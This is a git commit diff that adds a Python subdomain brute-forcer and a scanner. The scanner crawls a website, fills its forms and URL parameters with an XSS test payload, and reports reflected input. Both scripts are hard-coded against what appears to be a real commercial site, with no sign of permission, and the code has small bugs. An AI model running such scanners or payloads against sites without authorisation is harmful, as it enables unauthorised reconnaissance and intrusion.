c02c6b4b755d0d568be0987bc57022ec7b908e50
she6ilmsp <muhammedshebilmsp@gmail.com>
2022-04-20 17:55:01 +0530

    xss_vulnerability code added

---
+++ get_subdomains.py
@@ -0,0 +1,30 @@
+#!/usr/bin/python3
+
+import requests
+
+class Scanner:
+    def __init__(self, target_url, wordlist):
+        self.session = requests.Session()
+        self.target_url = target_url
+        self.wordlist = wordlist
+        self.subdomains = []
+    def get_subdomain(self):
+        with open(self.wordlist, "r") as list_of_subdomains:
+            for word in list_of_subdomains:
+                word = word.strip()
+                test_url = word + "." + self.target_url.split("://")[1]
+                try:
+                    response = self.session.get("https://" + test_url)
+                    if response:
+                        self.subdomains.append(test_url)
+                        print(test_url)
+                except requests.exceptions.ConnectionError:
+                    print("Not this")
+                    pass
+                
+
+target_url = "https://silkavenue.pk/my-account/"
+wordlist = "subdomain_wordlist.txt"
+
+find_subdomains = Scanner(target_url, wordlist)
+find_subdomains.get_subdomain()
--- scanner.py
+++ scanner.py
@@ -3,28 +3,13 @@
 import requests
 import re
 from urllib.parse import urljoin
-
+from bs4 import BeautifulSoup
 
 class Scanner:
-    def __init__(self, url, ignore_links):
+    def __init__(self, url):
         self.session = requests.Session()
         self.target_url = url
-        self.subdomains = []
         self.directories = []
-        self.links_to_ignore = ignore_links
-
-    def get_subdomain(self, wordlist):
-        with open(wordlist, "r") as list_of_subdomains:
-            for word in list_of_subdomains:
-                word = word.strip()
-                test_url = word + "." + self.target_url.split("://")[1]
-                try:
-                    response = self.session.get("https://" + test_url)
-                    if response:
-                        self.subdomains.append(test_url)
-                        print(test_url)
-                except requests.exceptions.ConnectionError:
-                    pass
 
     def get_directories(self, url=None):
         if url == None:
@@ -35,18 +20,75 @@ class Scanner:
             test_url = urljoin(url,link)
             if "#" in test_url:
                 test_url = test_url.split("#")[0]
-            if self.target_url in test_url and test_url not in self.directories and test_url not in self.links_to_ignore:
+            if self.target_url in test_url and test_url not in self.directories and "logout" not in test_url:
                 self.directories.append(test_url)
-                print(test_url)
+                print("[+] " + test_url)
                 self.get_directories(test_url)
 
+    def get_forms(self, url=None):
+        if url == None:
+            url = self.target_url
+        response = self.session.get(url)
+        parsed_html = BeautifulSoup(str(response.content), features="lxml")
+        return parsed_html.find_all("form")
+
+    def post_form(self, form, value, url):
+        action = form.get("action")
+        post_url = urljoin(url, action)
+        method = form.get("method")
+        input_lists = form.find_all("input")
+        post_data = {}
+        for input in input_lists:
+            input_name = input.get("name")
+            input_type = input.get("type")
+            input_value = input.get("value")
+            if input_type == "text":
+                input_value = value
+            post_data[input_name] = input_value
+        if method == "post":
+            return self.session.post(post_url, data=post_data)
+        return self.session.get(post_url, params=post_data)
+
+    def run_scanner(self):
+        for directory in self.directories:
+            forms = self.get_forms(directory)
+            for form in forms:
+                print("Testing form in " + directory)
+                is_vulnerable_to_xss = self.test_xss_vuln_in_post(form, directory)
+                if is_vulnerable_to_xss:
+                    print("\n\n[+++++] XSS Vulnerability found in form\n\n")
+            
+            if "=" in directory:
+                print("\nTesting parameter in " + directory)
+                is_vulnerable_to_xss = self.test_xss_vuln_in_get(directory)
+                if is_vulnerable_to_xss:
+                    print("\n\n[+++++] XSS Vulnerability found in parameter\n\n")
+        if is_vulnerable_to_xss:
+            print("\nTesting finished. Found some XSS vulnerablities.")
+        else:
+            print("\nTesting Finished. and there is no XSS vulnerabilities")
+
+    def test_xss_vuln_in_get(self, url):
+        payload = "<script>alert('poda');</scri>"
+        url = url.replace("=", "=" + payload)
+        response = self.session.get(url)
+        return payload in str(response.content)
+
+    def test_xss_vuln_in_post(self, form, url):
+        payload = "<script>alert('poda');</scri>"
+        response = self.post_form(form, payload, url)
+        return payload in str(response.content)
 
 
-wordlist = "worldlists/sample.txt"
-target_url = "https://silkavenue.pk/"
-ignore_links = "logout.php"
+target_url = "https://silkavenue.pk/return-and-shipping/"
 
-vuln_scanner = Scanner(target_url, ignore_links)
-
-vuln_scanner.get_subdomain(wordlist)
+vuln_scanner = Scanner(target_url)
+print("All directories belongs to this website are...\n")
 vuln_scanner.get_directories()
+if vuln_scanner.directories != None:
+    print("\nFound all directories\n")
+else:
+    print("\nOops! didn't find any directories\n")
+
+print("\nTesting directories if there is any vulnerability..\n")
+vuln_scanner.run_scanner()
